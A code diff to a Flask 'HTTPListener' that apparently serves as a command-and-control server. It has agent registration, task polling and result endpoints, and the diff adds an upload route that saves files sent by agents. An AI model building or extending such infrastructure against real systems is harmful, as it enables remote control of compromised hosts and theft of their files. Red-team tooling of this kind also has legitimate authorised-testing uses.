@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify, send_file
 from werkzeug.serving import make_server
-import threading, json, datetime, sqlite3
+from werkzeug.utils import secure_filename
+import threading, json, datetime, sqlite3, os
 
 class HTTPListener:
     con = None
@@ -19,6 +20,7 @@ class HTTPListener:
         self.app.add_url_rule('/register', 'register', self.register, methods=['POST'])
         self.app.add_url_rule('/<agent_id>/tasks', 'get_tasks', self.get_tasks, methods=['GET'])
         self.app.add_url_rule('/<agent_id>/results', 'post_results', self.post_results, methods=['POST'])
+        self.app.add_url_rule('/<agent_id>/upload', 'upload_file', self.upload_file, methods=['POST'])
 
     class ServerThread(threading.Thread):
         def __init__(self, app, host, port):
@@ -122,6 +124,33 @@ class HTTPListener:
         )
         self.con.commit()
         return
+    
+    def upload_file(self, agent_id):
+        try:
+            self.update_last_seen(agent_id)
+            if 'file' not in request.files:
+                return jsonify({"error": "No file part"}), 400
+                
+            file = request.files['file']
+            if file.filename == '':
+                return jsonify({"error": "No selected file"}), 400
+            
+            # Create uploads directory if needed
+            os.makedirs("uploads", exist_ok=True)
+            
+            # Save file with agent_id prefix
+            filename = f"{agent_id}_{secure_filename(file.filename)}"
+            file_path = os.path.join("uploads", filename)
+            file.save(file_path)
+            
+            self.update_history(agent_id, "file_upload", filename)
+            return jsonify({
+                "status": "success",
+                "filename": filename,
+                "size": os.path.getsize(file_path)
+            }), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
 
     def start(self):
         if not self.server:
